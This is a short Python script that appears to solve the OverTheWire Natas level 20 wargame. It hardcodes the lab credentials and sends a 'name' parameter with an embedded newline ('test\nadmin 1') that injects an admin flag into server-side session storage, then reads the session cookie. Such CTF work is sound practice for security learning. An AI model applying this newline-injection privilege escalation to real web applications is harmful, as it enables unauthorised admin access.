import requests

# Constants
BASE_URL = 'http://natas20.natas.labs.overthewire.org'
BASE_USERNAME = 'natas20'
BASE_PASSWORD = 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH'

# Request to check PHPSESSID is correct
params_first = dict(name='test\nadmin 1', debug='')
response_first = requests.get(BASE_URL, auth=(BASE_USERNAME, BASE_PASSWORD), params=params_first)
phpsessid = response_first.cookies['PHPSESSID']
print(response_first.text)
